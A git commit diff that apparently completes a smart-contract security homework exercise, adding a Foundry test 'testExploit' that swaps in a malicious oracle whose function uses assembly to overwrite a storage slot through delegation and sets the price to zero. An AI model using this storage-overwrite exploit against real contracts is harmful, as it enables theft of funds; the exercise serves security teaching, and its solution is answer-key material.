60463a62cbd3d20140fd4a339f37a05cc85ccaef
Tzu-Hao Lin <haroldlin.0921@gmail.com>
2024-08-25 21:00:30 +0800

    UntrustedOracle done

--- hw/test/Delegation/UntrustedOracle.t.sol
+++ hw/test/Delegation/UntrustedOracle.t.sol
@@ -6,8 +6,32 @@ import {Test, console2} from "forge-std/Test.sol";
 import {UntrustedOracleBaseTest} from "./UntrustedOracleBase.t.sol";
 
 contract UntrustedOracleTest is UntrustedOracleBaseTest {
+    
+    address public new_oracle;
+
     function testExploit() external validation {
-        // TODO
+
+        new_oracle = address(this);
+        vm.startPrank(owner);
+        oracle.setOracle0(new_oracle);
+        vm.stopPrank();
+        oracle.setOracle0Price(0);
+        
+    }
+
+    function setOraclePrice(uint256 _price) external {
+        address newOwner = msg.sender;
+        assembly {
+            sstore(3, newOwner)
+        }
+    }
+
+    function getOraclePrice() external view returns (uint256) {
+        return 0;
+    }
+
+    fallback() external payable {
+        
     }
 }
 
